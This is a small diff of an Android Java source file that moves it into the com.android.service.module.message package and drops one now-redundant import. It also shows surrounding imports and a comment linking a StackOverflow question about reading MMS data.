@@ -1,4 +1,4 @@
-package com.android.service.interfaces;
+package com.android.service.module.message;
 
 import android.content.ContentResolver;
 import android.database.ContentObserver;
@@ -10,7 +10,6 @@ import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.manager.ManagerAgent;
 import com.android.service.module.ModuleMessage;
-import com.android.service.module.message.Sms;
 
 /**
  * http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
